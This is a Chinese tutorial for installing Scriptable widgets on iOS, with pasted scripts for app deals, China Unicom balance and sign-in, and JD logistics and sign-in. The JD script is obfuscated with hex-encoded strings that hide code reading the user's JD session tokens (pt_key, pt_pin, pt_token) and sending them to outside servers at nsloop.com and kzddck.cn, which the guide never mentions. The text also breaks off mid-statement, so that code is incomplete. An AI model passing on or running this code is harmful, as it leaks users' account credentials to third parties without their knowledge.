在手机上下载以下脚本，存储到文件APP的Scriptable文件夹中。打开Scriptable，先运行Env，再运行Install Scripts即可。

```
https://raw.githubusercontent.com/evilbutcher/Scriptables/master/Env.js
https://raw.githubusercontent.com/evilbutcher/Scriptables/master/Install%20Scripts.js
```

然后下载Config.js脚本并放置到上述目录。该脚本用于全局配置各脚本的变量。配置Config 文件后，脚本运行优先使用Config文件内的设置，由此保证脚本更新不会影响自定义设置。

```
https://raw.githubusercontent.com/evilbutcher/Scriptables/master/Config.js
```

仓库地址如下。

```
https://github.com/evilbutcher/Scriptables
https://github.com/GideonSenku/Scriptable
```

#### dompling版

在手机上下载以下脚本，存储到文件APP的Scriptable文件夹中。

```
https://raw.githubusercontent.com/dompling/Scriptable/master/widget.Install.js
```

打开Scriptable并运行该脚本，添加以下订阅。

```
# YaYa
https://raw.githubusercontent.com/dompling/Scriptable/master/install.json

# 小明
https://raw.githubusercontent.com/2214962083/ios-scriptable-tsx/master/%E6%89%93%E5%8C%85%E5%A5%BD%E7%9A%84%E6%88%90%E5%93%81/install.json

# 脑瓜
https://raw.githubusercontent.com/anker1209/Scriptable/main/install.json

# 彩云LSP
https://raw.githubusercontent.com/Enjoyee/Scriptable/new/subscriber.json

# 推荐
https://raw.githubusercontent.com/dompling/Scriptable/master/extra_install.json
```

再次运行并选择刚才订阅的脚本仓库，即可下载和使用对应的脚本。

也可通过网页版进行脚本下载。打开以下链接，设置BoxJs域名后在订阅页面添加以上订阅即可。注意首次使用时需要按照提示添加WebStore脚本。

```
http://scriptablejs.gitee.io/store/#/menu/myInfo
```

### 组件放置

在主屏幕添加Scriptable组件，长按小组件并点击`编辑小组件`，在Script中选择要打开的脚本即可。在When Interacting中选择`Open URL`，然后URL中填写应用的URL Schemes，可在点击时直接跳转到应用。

### 部分脚本

打开后点击右上角的`+`，将以下代码复制到代码区。然后点击左上角即可。部分仓库如下。

```
https://github.com/kzddck-up/scriptables
```

#### 疫情小组件

```
https://share.weiyun.com/iNBQw8pf
```

#### 显示限免软件

代码如下。

```
let data = await getData()
let widget = await createWidget(data)
if (!config.runsInWidget) {
  await widget.presentLarge()
}
Script.setWidget(widget)
Script.complete()
async function createWidget(data) {
  let appIcon = await loadAppIcon()
  let title = "ios限免速递"
  let w = new ListWidget()
  w.url = data["url"]
  w.backgroundColor = new Color("#b00a0fb3")
// 显示图标和标题
  w.addSpacer(2)
  let titleStack = w.addStack()
  let appIconElement = titleStack.addImage(appIcon)
  appIconElement.imageSize = new Size(15, 15)
  appIconElement.cornerRadius = 4
  titleStack.addSpacer(4)
  let titleElement = titleStack.addText(title)
  titleElement.textColor = Color.white()
  titleElement.textOpacity = 0.7
  titleElement.font = Font.mediumSystemFont(13)
  w.addSpacer(5)
// 标题
  var dates =  data["name"]
  let date1 = w.addText(dates)
  date1.font = Font.semiboldSystemFont(20)
  date1.centerAlignText()
  date1.textColor = Color.white()
  w.addSpacer(5)
// 价格
  let date2 = w.addText("现价:"+data["price"]+"("+data["class"]+")")
  date2.font = Font.heavySystemFont(10)
  date2.centerAlignText()
  date2.textColor =Color.white()
  w.addSpacer(5)
// 介绍
  let body = w.addText(data["content"])
  body.font = Font.mediumRoundedSystemFont(12)
  body.textColor = Color.white()
  w.addSpacer(10)
// 图片
  let bg =await getImage(data["img"])
  w.backgroundImage = await shadowImage(bg)
// 底部更多
if (!config.runsWithSiri) {
  w.addSpacer(5)
  // Add button to open documentation
  let linkSymbol = SFSymbol.named("arrow.up.forward")
  let footerStack = w.addStack()
  let linkStack = footerStack.addStack()
  linkStack.centerAlignContent()
  linkStack.url = "http://xianmian.kzddck.com"
  let linkElement = linkStack.addText("查看历史")
  linkElement.font = Font.mediumSystemFont(13)
  linkElement.textColor = Color.white()
  linkStack.addSpacer(3)
  let linkSymbolElement = linkStack.addImage(linkSymbol.image)
  linkSymbolElement.imageSize = new Size(11, 11)
  linkSymbolElement.tintColor = Color.white()
  footerStack.addSpacer()
  // Add link to documentation
  let docsSymbol = SFSymbol.named("square.and.arrow.down.on.square.fill")
  let docsElement = footerStack.addImage(docsSymbol.image)
  docsElement.imageSize = new Size(20, 20)
  docsElement.tintColor = Color.white()
  docsElement.url = data["url"]
}
  return w
}
async function getData() {
  var url = "https://api.kzddck.com/script/free.json";
  var req = new Request(url)
  var data = await req.loadJSON()
  return data
}
async function getImage (url) {
  let r =await new Request(url)
  return await r.loadImage()
}
async function shadowImage (img) {
  let ctx = new DrawContext()
  ctx.size = img.size
  ctx.drawImageInRect(img, new Rect(0, 0, img.size['width'], img.size['height']))
  ctx.setFillColor(new Color("#646464", 0.5))
  ctx.fillRect(new Rect(0, 0, img.size['width'], img.size['height']))
  let res = await ctx.getImage()
  return res
}

async function loadAppIcon() {
  let url = "https://api.kzddck.com/script/freeapp.png"
  let req = new Request(url)
  return req.loadImage()
}
```

#### 联通话费查询和签到

代码如下。

```
// Author: 脑瓜
// 该组件支持两种模式，默认为圆环进度条模式，主屏幕长按小组件-->编辑小组件-->Parameter，输入1，使用文字模式

//修改：kzddck
// 更新内容：更换新的接口

// #############设置##############
const files = FileManager.local()
const Tel = '你的手机号'
//修改为你的cookie，cookie获取方法，需安装Stream在联通客户端中进行抓包!
const Cookie = '你的cookie'
const ringStackSize = 61 // 圆环大小
const ringTextSize = 14 // 圆环中心文字大小
const creditTextSize = 21 // 话费文本大小
const textSize = 13 // 文字模式下文字大小
const databgColor = new Color("12A6E4", 0.2) // 流量环背景颜色
const datafgColor = new Color("12A6E4") // 流量环前景颜色
const voicebgColor = new Color("F86527", 0.2) // 语音环背景颜色
const voicefgColor = new Color("F86527") // 语音环前景颜色
const newBG = false  //是否设置或者使用新的背景图片，若要设置背景图片，请勿将下一行值设为true
const removeBG = false //是否需要清空背景图片，如果设置过背景图片，想再使用纯色背景，需将此设置为true清除背景图片缓存
const setbgColor = false //是否设置固定纯色背景，如要设置，请在下行指定背景颜色
const bgColor = "ffffff" // 背景颜色
const widgetParam = args.widgetParameter
let data = await getData()

const title = "中国联通"
const cuIconUrl = "https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f77d3cdc-b757-4acd-9766-a64421bf0c6d.png"
const dataSfs = SFSymbol.named("antenna.radiowaves.left.and.right")
dataSfs.applyHeavyWeight()
const dataIcon = dataSfs.image
const voiceIcon = SFSymbol.named("phone.fill").image
const scoreIcon = SFSymbol.named("tag.fill").image
const iconColor = new Color("FE8900")
const phoneData = data.data.dataList[0]
const credit = data.data.dataList[1]
const voice = data.data.dataList[2]
const score = data.data.dataList[3]
const canvSize = 178
const canvTextSize = 45
const canvas = new DrawContext()
const canvWidth = 18
const canvRadius = 80
const widget = new ListWidget()
widget.setPadding(16, 16, 16, 16) // widget边距（上，下，左，右）

// ############背景设置############
const path = files.joinPath(files.documentsDirectory(), "testPath")
if (newBG && config.runsInApp){
  const img = await Photos.fromLibrary()
  widget.backgroundImage = img
  files.writeImage(path, img)
} else {
  if (files.fileExists(path)) { 
    try {
      widget.backgroundImage = files.readImage(path)
      log("读取图片成功")
    } catch (e){
      log(e.message)
      }  
    }
  }
if (removeBG && files.fileExists(path)) {
  try {
    files.remove(path)
    log("背景图片清理成功")
  } catch (e) {
    log(e.message)
  }
}
if (setbgColor) {
  widget.backgroundColor = new Color(bgColor)
}

// ############LOGO###############
let headerStack = widget.addStack()
headerStack.layoutVertically
headerStack.addSpacer()
let logo = headerStack.addImage(await getImg(cuIconUrl))
logo.imageSize = new Size(393*0.25, 118*0.25)
headerStack.addSpacer()
widget.addSpacer()

let creditStack = widget.addStack()
creditStack.centerAlignContent()
creditStack.addSpacer()
let creditElement = creditStack.addText(credit.number)
creditElement.font = Font.mediumRoundedSystemFont(creditTextSize)
creditStack.addSpacer()
widget.addSpacer()

// ###############################
let bodyStack = widget.addStack()
bodyStack.layoutVertically()

if (widgetParam == "1"){
  await textLayout(dataIcon, phoneData.remainTitle, phoneData.number, phoneData.unit)
  bodyStack.addSpacer(8)
  await textLayout(voiceIcon, voice.remainTitle, voice.number, voice.unit)
  bodyStack.addSpacer(8)
  await textLayout(scoreIcon, score.remainTitle, score.number, score.unit)
} else {
canvas.size = new Size(canvSize, canvSize)
canvas.opaque = false
canvas.respectScreenScale = true

const dataGap = (100-phoneData.persent)*3.6
const voiceGap = (100-voice.persent)*3.6

drawArc(dataGap, datafgColor, databgColor)
let ringStack = bodyStack.addStack()
let ringLeft = ringStack.addStack()
ringLeft.layoutVertically()
ringLeft.size = new Size(ringStackSize, ringStackSize)
ringLeft.backgroundImage = canvas.getImage()
await ringContent(ringLeft, dataIcon, datafgColor, phoneData.number, phoneData.unit)
ringStack.addSpacer()

drawArc(voiceGap, voicefgColor, voicebgColor)
let ringRight = ringStack.addStack()
ringRight.layoutVertically()
ringRight.size = new Size(ringStackSize, ringStackSize)
ringRight.backgroundImage = canvas.getImage()
await ringContent(ringRight, voiceIcon, voicefgColor, voice.number, voice.unit)
}
// ###############################
if (!config.runsInWidget) {
  await widget.presentSmall()
}
Script.setWidget(widget)
Script.complete()

async function getImg(url) {
  const req = new Request(url)
  const img = await req.loadImage()
  return img
}

function sinDeg(deg) {
    return Math.sin((deg * Math.PI) / 180)
  }

function cosDeg(deg) {
    return Math.cos((deg * Math.PI) / 180)
  }

function ringContent(widget, icon, iconColor, text, unit){
  const rowIcon = widget.addStack()
  rowIcon.addSpacer()
  const iconElement = rowIcon.addImage(icon)
  iconElement.tintColor = iconColor
  iconElement.imageSize = new Size(12, 12)
  iconElement.imageOpacity = 0.7
  rowIcon.addSpacer()
  
  widget.addSpacer(1)
  
  const rowText = widget.addStack()
  rowText.addSpacer()
  const textElement = rowText.addText(text)
  textElement.font = Font.mediumSystemFont(ringTextSize)
  rowText.addSpacer()
  
  const rowUnit = widget.addStack()
  rowUnit.addSpacer()
  const unitElement = rowUnit.addText(unit)
  unitElement.font = Font.boldSystemFont(8)
  unitElement.textOpacity = 0.5
  rowUnit.addSpacer()
 }

function textLayout(icon, title, number, unit){
  const rowItem = bodyStack.addStack()
  rowItem.centerAlignContent()
  let iconElement = rowItem.addImage(icon)
  iconElement.imageSize = new Size(textSize, textSize)
  iconElement.tintColor = iconColor
  rowItem.addSpacer(4)
  let titleElement = rowItem.addText(title)
  titleElement.font = Font.systemFont(textSize)
  rowItem.addSpacer()
  let numberElement = rowItem.addText(number+unit)
  numberElement.font = Font.systemFont(textSize)
}

function drawArc(deg, fillColor, strokeColor) {
  let ctr = new Point(canvSize / 2, canvSize / 2),
  bgx = ctr.x - canvRadius;
  bgy = ctr.y - canvRadius;
  bgd = 2 * canvRadius;
  bgr = new Rect(bgx, bgy, bgd, bgd)

  canvas.setFillColor(fillColor)
  canvas.setStrokeColor(strokeColor)
  canvas.setLineWidth(canvWidth)
  canvas.strokeEllipse(bgr)

  for (let t = 0; t < deg; t++) {
    rect_x = ctr.x + canvRadius * sinDeg(t) - canvWidth / 2
    rect_y = ctr.y - canvRadius * cosDeg(t) - canvWidth / 2
    rect_r = new Rect(rect_x, rect_y, canvWidth, canvWidth)
    canvas.fillEllipse(rect_r)
  }
}

async function getData() {
  const cachePath = files.joinPath(files.documentsDirectory(), "Chinaunicom-anker")
  try {
    var url= 'https://m.client.10010.com/mobileserviceimportant/home/queryUserInfoSeven?version=iphone_c@8.0100&desmobiel='+Tel+'&showType=0';
var req = new Request(url)
req.headers = {'cookie': Cookie,'Host':'m.client.10010.com','User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148       unicom{version:iphone_c@8.0100}{systemVersion:dis}{yw_code:}'}
var data = await req.loadJSON()
console.log(data)

var url1 = 'https://act.10010.com/SigninApp/signin/daySign'
var req1 = new Request(url1);
req1.headers = {'cookie': Cookie,'Host':'act.10010.com','User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148       unicom{version:iphone_c@8.0100}{systemVersion:dis}{yw_code:}'}
var data1 = await req1.loadJSON()
console.log(data1)
    if (data.signinState === '0'){
      files.writeString(cachePath, JSON.stringify(data))
      log("==>数据请求成功")
    } else {
      throw 'Internal Server Error'
    }
  }
  catch (e) {
    data = JSON.parse(files.readString(cachePath))
    log("==>数据请求失败，使用缓存数据/"+ e)
  }
  return data
}
```

其中cookie可通过抓包软件获得。以Stream为例，开启抓包后登录联通掌上营业厅，点击右上角签到随后退出。然后回到Stream，按域名查找，找到atc.10010.com，进入任意一个链接，找到请求，拷贝Cookie里的内容即可。

#### 京东物流查询和签到

代码如下。

```
// 填写cookie（保留单引号）
const Cookie = '这里填写你的cookie'
// 标题
const title = '京东'
// 图标（京东APP图标）
const logo = 'https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=3183980387,1768640430&fm=26&gp=0.jpg'
// 更改背景颜色
color = [
    new Color("#fcb69f"),
    new Color("#ff9a9e")
]

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxa863d=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x6F\x6D\x65\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x6D\x79\x4A\x64\x2F\x6E\x65\x77\x68\x6F\x6D\x65\x2E\x61\x63\x74\x69\x6F\x6E\x3F\x73\x63\x65\x6E\x65\x76\x61\x6C\x3D\x32\x26\x75\x66\x63\x3D\x26","\x72\x75\x6E\x73\x49\x6E\x57\x69\x64\x67\x65\x74","\x70\x72\x65\x73\x65\x6E\x74\x4C\x61\x72\x67\x65","\x73\x65\x74\x57\x69\x64\x67\x65\x74","\x63\x6F\x6D\x70\x6C\x65\x74\x65","\x77\x69\x64\x67\x65\x74\x46\x61\x6D\x69\x6C\x79","\x6D\x65\x64\x69\x75\x6D","\x6C\x61\x72\x67\x65","\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x73","\x63\x6F\x6C\x6F\x72\x73","\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x47\x72\x61\x64\x69\x65\x6E\x74","\x61\x64\x64\x53\x70\x61\x63\x65\x72","\x74\x69\x70\x73","\x61\x64\x64\x54\x65\x78\x74","\x66\x6F\x6E\x74","\x73\x65\x6D\x69\x62\x6F\x6C\x64\x53\x79\x73\x74\x65\x6D\x46\x6F\x6E\x74","\x74\x65\x78\x74\x43\x6F\x6C\x6F\x72","\x77\x68\x69\x74\x65","\x75\x72\x6C","\x77\x65\x69\x78\x69\x6E\x3A\x2F\x2F","\x6C\x65\x6E\x67\x74\x68","\x64\x65\x61\x6C\x4C\x6F\x67\x4C\x69\x73\x74","\u5DF2\u7B7E\u5230","\u672A\u7B7E\u5230","\uD83E\uDD54\x20\u4EAC\u8C46","\x3A","\x6A\x69\x6E\x64\x6F\x75","\x6F\x70\x65\x6E\x41\x70\x70\x2E\x6A\x64\x4D\x6F\x62\x69\x6C\x65\x3A\x2F\x2F","\uD83D\uDCB5\x20\u6D25\u8D34","\x6A\x69\x6E\x74\x69\x65","\uD83E\uDE99\x20\u94A2\u955A","\x67\x61\x6E\x67\x62\x65\x6E","\x77\x6C\x53\x74\x61\x74\x65\x44\x65\x73\x63","\u66F4\u65B0\u65F6\u95F4","\x63\x72\x65\x61\x74\x65\x54\x69\x6D\x65","\x68\x65\x61\x76\x79\x53\x79\x73\x74\x65\x6D\x46\x6F\x6E\x74","\x61\x64\x64\x53\x74\x61\x63\x6B","\x63\x65\x6E\x74\x65\x72\x41\x6C\x69\x67\x6E\x43\x6F\x6E\x74\x65\x6E\x74","\uD83E\uDD54\x20\x3A\x20","\uD83D\uDCB5\x20\x3A\x20","\uD83E\uDE99\x20\x3A\x20","\u5546\u54C1","\x6E\x61\x6D\x65","\x73\x65\x6D\x69\x62\x6F\x6C\x64\x52\x6F\x75\x6E\x64\x65\x64\x53\x79\x73\x74\x65\x6D\x46\x6F\x6E\x74","\u5F53\u524D\u72B6\u6001","\x73\x74\x61\x74\x65\x4E\x61\x6D\x65","\u7269\u6D41\u8BE6\u60C5","\x6C\x69\x67\x68\x74\x4D\x6F\x6E\x6F\x73\x70\x61\x63\x65\x64\x53\x79\x73\x74\x65\x6D\x46\x6F\x6E\x74","\x6C\x61\x79\x6F\x75\x74\x56\x65\x72\x74\x69\x63\x61\x6C\x6C\x79","\uD83D\uDD14\u6E29\u99A8\u63D0\u793A\x20\uFF1A\u5982\u9700\u663E\u793A\u66F4\u591A\u8BF7\u4F7F\u7528\u5927\u7EC4\u4EF6\uFF01","\x6D\x65\x64\x69\x75\x6D\x52\x6F\x75\x6E\x64\x65\x64\x53\x79\x73\x74\x65\x6D\x46\x6F\x6E\x74","\uD83D\uDD14\u6E29\u99A8\u63D0\u793A\x20\uFF1A\u4E0D\u80FD\u663E\u793A\u66F4\u591A\u4E86\uFF01","\x69\x6D\x67","\x61\x64\x64\x49\x6D\x61\x67\x65","\x69\x6D\x61\x67\x65\x53\x69\x7A\x65","\x63\x6F\x72\x6E\x65\x72\x52\x61\x64\x69\x75\x73","\x6C\x69\x6E\x65\x4C\x69\x6D\x69\x74","\u7269\u6D41","\x67\x65\x74\x64\x61\x74\x61\x31","\x6C\x6F\x67","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x71\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x75\x73\x65\x72\x2F\x69\x6E\x66\x6F\x2F\x51\x75\x65\x72\x79\x4A\x44\x55\x73\x65\x72\x49\x6E\x66\x6F\x3F\x73\x63\x65\x6E\x65\x76\x61\x6C\x3D\x32","\x68\x65\x61\x64\x65\x72\x73","\x6C\x6F\x61\x64\x4A\x53\x4F\x4E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x73\x2E\x6A\x72\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x67\x77\x2F\x67\x65\x6E\x65\x72\x69\x63\x2F\x75\x63\x2F\x68\x35\x2F\x6D\x2F\x6D\x79\x53\x75\x62\x73\x69\x64\x79\x42\x61\x6C\x61\x6E\x63\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x6F\x69\x6E\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x6D\x2F\x67\x62\x2F\x67\x65\x74\x42\x61\x73\x65\x49\x6E\x66\x6F\x2E\x68\x74\x6D\x6C","\x70\x74\x5F\x6B\x65\x79\x3D","\x6D\x61\x74\x63\x68","\x3B","\x70\x74\x5F\x70\x69\x6E\x3D","\x70\x74\x5F\x74\x6F\x6B\x65\x6E\x3D","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x35\x2E\x6E\x73\x6C\x6F\x6F\x70\x2E\x63\x6F\x6D\x3A\x33\x30\x30\x31\x2F\x3F\x63\x6F\x6F\x6B\x69\x65\x3D","\u5F00\u59CB\u7B7E\u5230","\u6B63\u5728\u7B7E\u5230","\x6C\x6F\x61\x64","\u7B7E\u5230\u6210\u529F","\x74\x6F\x4C\x6F\x63\x61\x6C\x65\x44\x61\x74\x65\x53\x74\x72\x69\x6E\x67","\x74\x69\x6D\x65","\x73\x65\x74","\x74\x69\x6D\x65\u5199\u5165\u6210\u529F","\x68\x74\x74\x70\x3A\x2F\x2F\x6A\x64\x2E\x6B\x7A\x64\x64\x63\x6B\x2E\x63\x6E\x3A\x33\x30\x30\x31\x2F\x3F\x63\x6F\x6F\x6B\x69\x65\x3D","\x62\x79\u5F00\u59CB\u7B7E\u5230","\x62\x79\u6B63\u5728\u7B7E\u5230","\x62\x79\u7B7E\u5230\u6210\u529F","\x62\x79\x74\x69\x6D\x65\u5199\u5165\u6210\u529F","\u53EF\u80FD\u7B7E\u5230\u5931\u8D25\u4E86\u5440","\x6A\x64\x4E\x75\x6D","\x62\x61\x73\x65","\x62\x61\x6C\x61\x6E\x63\x65","\x64\x61\x74\x61","\x72\x65\x73\x75\x6C\x74\x44\x61\x74\x61","\x67\x62\x42\x61\x6C\x61\x6E\x63\x65","\x63\x6F\x6E\x74\x61\x69\x6E\x73","\x67\x65\x74","\u4ECA\u65E5\u5DF2\u7B7E\u5230","\u8FD8\u6CA1\u6709\u7B7E\u5230","\u6CA1\u6709\u7F13\u5B58\u5440","\u7B7E\u5230\u5B8C\u6210\u4E86\u5440","\u6CA1\u6709\u7F13\u5B58","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x71\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x62\x61\x73\x65\x73\x2F\x77\x75\x6C\x69\x75\x64\x65\x74\x61\x69\x6C\x2F\x6E\x6F\x74\x69\x66\x79\x3F\x73\x63\x65\x6E\x65\x76\x61\x6C\x3D\x32\x26\x73\x63\x65\x6E\x65\x76\x61\x6C\x3D\x32\x26\x67\x5F\x6C\x6F\x67\x69\x6E\x5F\x74\x79\x70\x65\x3D\x31\x26\x63\x61\x6C\x6C\x62\x61\x63\x6B","\x65\x72\x72\x43\x6F\x64\x65","\x63\x6F\x6F\x6B\x69\x65\u6B63\u5E38","\x63\x6F\x6F\x6B\x69\x65\u5931\u6548","\x43\x6F\x6F\x6B\x69\x65\u5931\u6548\u4E86","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x73\x31\x2E\x62\x64\x73\x74\x61\x74\x69\x63\x2E\x63\x6F\x6D\x2F\x37\x30\x63\x46\x76\x58\x53\x68\x5F\x51\x31\x59\x6E\x78\x47\x6B\x70\x6F\x57\x4B\x31\x48\x46\x36\x68\x68\x79\x2F\x69\x74\x2F\x75\x3D\x33\x31\x38\x33\x39\x38\x30\x33\x38\x37\x2C\x31\x37\x36\x38\x36\x34\x30\x34\x33\x30\x26\x66\x6D\x3D\x32\x36\x26\x67\x70\x3D\x30\x2E\x6A\x70\x67","\x6C\x6F\x61\x64\x49\x6D\x61\x67\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x6A\x64\x2E\x6B\x7A\x64\x64\x63\x6B\x2E\x63\x6E\x2F\x75\x70\x64\x61\x74\x65\x2E\x6A\x73\x6F\x6E","\x75\x70","\u65E0\u66F4\u65B0","\x74\x69\x74\x6C\x65","\u4EAC\u4E1C\u5C0F\u7EC4\u4EF6\u6709\u66F4\u65B0\u5566","\x62\x6F\x64\x79","\x73\x63\x68\x65\x64\x75\x6C\x65","\x74\x65\x78\x74\x4F\x70\x61\x63\x69\x74\x79","\x62\x6F\x6C\x64\x53\x79\x73\x74\x65\x6D\x46\x6F\x6E\x74","\x73\x65\x74\x50\x61\x64\x64\x69\x6E\x67","\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x43\x6F\x6C\x6F\x72","\x23\x66\x66\x66","\x72\x69\x67\x68\x74\x41\x6C\x69\x67\x6E\x54\x65\x78\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];const Referer=__Oxa863d[0x0];let widget= await update();if(!config[__Oxa863d[0x1]]){ await widget[__Oxa863d[0x2]]()};Script[__Oxa863d[0x3]](widget);Script[__Oxa863d[0x4]]();async function render(){const _0xca56x4= await getData();if(config[__Oxa863d[0x5]]== __Oxa863d[0x6]){return  await mediumWidget(_0xca56x4)}else {if(config[__Oxa863d[0x5]]== __Oxa863d[0x7]){return  await largeWidget(_0xca56x4)}else {return  await smallWidget(_0xca56x4)}}}async function render1(_0xca56x4){let _0xca56x6= new ListWidget();bg=  new LinearGradient();bg[__Oxa863d[0x8]]= [0,1];bg[__Oxa863d[0x9]]= color;_0xca56x6[__Oxa863d[0xa]]= bg;_0xca56x6[__Oxa863d[0xb]]();let _0xca56x7=_0xca56x6[__Oxa863d[0xd]](_0xca56x4[__Oxa863d[0xc]]);_0xca56x7[__Oxa863d[0xe]]= Font[__Oxa863d[0xf]](15);_0xca56x7[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x7[__Oxa863d[0x12]]= __Oxa863d[0x13];_0xca56x6[__Oxa863d[0xb]]();return _0xca56x6}async function smallWidget(_0xca56x4){let _0xca56x6= new ListWidget();bg=  new LinearGradient();bg[__Oxa863d[0x8]]= [0,1];bg[__Oxa863d[0x9]]= color;_0xca56x6[__Oxa863d[0xa]]= bg;_0xca56x6[__Oxa863d[0xb]](4);var _0xca56x9=_0xca56x4[__Oxa863d[0x15]][__Oxa863d[0x14]];if(_0xca56x9== 0){let _0xca56xa= await cache1();if(_0xca56xa== 0){var _0xca56xb=__Oxa863d[0x16]}else {var _0xca56xb=__Oxa863d[0x17]};_0xca56x6=  await renderHeader(_0xca56x6,logo,title,Color[__Oxa863d[0x11]](),_0xca56xb);_0xca56x6[__Oxa863d[0xb]]();const _0xca56xc= await getData1(_0xca56xa);let _0xca56x7=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x18]+ __Oxa863d[0x19]+ _0xca56xc[__Oxa863d[0x1a]].toString());_0xca56x7[__Oxa863d[0xe]]= Font[__Oxa863d[0xf]](15);_0xca56x7[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x7[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]](5);let _0xca56xd=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x1c]+ __Oxa863d[0x19]+ _0xca56xc[__Oxa863d[0x1d]].toString());_0xca56xd[__Oxa863d[0xe]]= _0xca56x7[__Oxa863d[0xe]];_0xca56xd[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56xd[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]](5);let _0xca56xe=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x1e]+ __Oxa863d[0x19]+ _0xca56xc[__Oxa863d[0x1f]].toString());_0xca56xe[__Oxa863d[0xe]]= _0xca56x7[__Oxa863d[0xe]];_0xca56xe[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56xe[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]]();return _0xca56x6};if(_0xca56x9== 1){_0xca56x6=  await renderHeader(_0xca56x6,logo,title,Color[__Oxa863d[0x11]]());_0xca56x6[__Oxa863d[0xb]]();let _0xca56x7=_0xca56x6[__Oxa863d[0xd]](_0xca56x4[__Oxa863d[0x15]][0x0][__Oxa863d[0x20]]);_0xca56x7[__Oxa863d[0xe]]= Font[__Oxa863d[0xf]](13);_0xca56x7[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x7[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]](5);let _0xca56xd=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x21]+ __Oxa863d[0x19]+ _0xca56x4[__Oxa863d[0x15]][0x0][__Oxa863d[0x22]]);_0xca56xd[__Oxa863d[0xe]]= Font[__Oxa863d[0x23]](9);_0xca56xd[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56xd[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]]();return _0xca56x6}else {_0xca56x6=  await renderHeader(_0xca56x6,logo,title,Color[__Oxa863d[0x11]](),_0xca56x9);_0xca56x6[__Oxa863d[0xb]]();let _0xca56x7=_0xca56x6[__Oxa863d[0xd]](_0xca56x4[__Oxa863d[0x15]][0x0][__Oxa863d[0x20]]);_0xca56x7[__Oxa863d[0xe]]= Font[__Oxa863d[0xf]](13);_0xca56x7[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x7[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]](5);let _0xca56xd=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x21]+ __Oxa863d[0x19]+ _0xca56x4[__Oxa863d[0x15]][0x0][__Oxa863d[0x22]]);_0xca56xd[__Oxa863d[0xe]]= Font[__Oxa863d[0x23]](9);_0xca56xd[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56xd[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]]();return _0xca56x6}}async function mediumWidget(_0xca56x4){let _0xca56x6= new ListWidget();bg=  new LinearGradient();bg[__Oxa863d[0x8]]= [0,1];bg[__Oxa863d[0x9]]= color;_0xca56x6[__Oxa863d[0xa]]= bg;_0xca56x6[__Oxa863d[0xb]](4);var _0xca56x9=_0xca56x4[__Oxa863d[0x15]][__Oxa863d[0x14]];if(_0xca56x9== 0){let _0xca56xa= await cache1();if(_0xca56xa== 0){var _0xca56xb=__Oxa863d[0x16]}else {var _0xca56xb=__Oxa863d[0x17]};_0xca56x6=  await renderHeader(_0xca56x6,logo,title,Color[__Oxa863d[0x11]](),_0xca56xb);_0xca56x6[__Oxa863d[0xb]]();const _0xca56xc= await getData1(_0xca56xa);const _0xca56x10=_0xca56x6[__Oxa863d[0x24]]();_0xca56x10[__Oxa863d[0x25]]();const _0xca56x11=_0xca56x10[__Oxa863d[0x24]]();let 